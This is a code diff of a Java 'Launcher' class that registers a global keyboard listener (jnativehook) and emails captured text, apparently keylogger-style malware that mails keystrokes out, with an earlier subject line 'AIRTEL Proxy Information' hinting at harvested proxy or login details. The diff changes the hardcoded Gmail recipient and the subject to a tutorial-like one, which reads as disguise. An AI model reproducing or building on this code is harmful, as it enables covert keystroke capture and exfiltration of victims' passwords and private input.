@@ -16,9 +16,12 @@ import javax.mail.Transport;
 import javax.mail.internet.InternetAddress;
 import javax.mail.internet.MimeMessage;
 
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 import org.springframework.context.ConfigurableApplicationContext;
+import org.springframework.context.annotation.ComponentScan;
 import org.springframework.context.support.ClassPathXmlApplicationContext;
 
 import com.capture.mail.CrunchifyEmailAPI;
@@ -278,11 +281,11 @@ public class Launcher implements NativeKeyListener {
 		// @Service("crunchifyEmail") <-- same annotation you specified in
 		// CrunchifyEmailAPI.java
 		CrunchifyEmailAPI crunchifyEmailAPI = (CrunchifyEmailAPI) context.getBean("crunchifyEmail");
-		String toAddr = "octronanonymous@gmail.com";
-		String fromAddr = "octronanonymous@gmail.com";
+		String toAddr = "rantonasoavina@gmail.com";
+		String fromAddr = "rantonasoavina@gmail.com";
 
 		// email subject
-		String subject = "AIRTEL Proxy Information";
+		String subject = "Hey.. This email sent by Crunchify's Spring MVC Tutorial";
 
 		// email body
 		String body = toSend;
